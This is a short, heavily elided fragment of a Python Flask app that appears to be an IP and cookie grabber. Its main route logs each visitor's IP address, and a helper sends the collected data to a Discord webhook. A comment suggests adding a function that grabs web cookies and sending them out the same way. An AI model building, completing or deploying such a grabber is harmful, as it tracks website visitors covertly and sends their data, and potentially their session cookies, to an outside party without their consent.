...
def send_to_discord(message):
    ...
    try:
        ...
        response.raise_for_status()  # Raises an error for HTTP errors (status codes other than 2xx)
        print("Data sent successfully to Discord!")
    except requests.exceptions.RequestException as e:
        print("Error sending data to Discord webhook:", e)



# if you had a function to grab some web cookies, you need to change the message to add it and recieve it          
@app.route('/')
def main():
    ip = iplog()
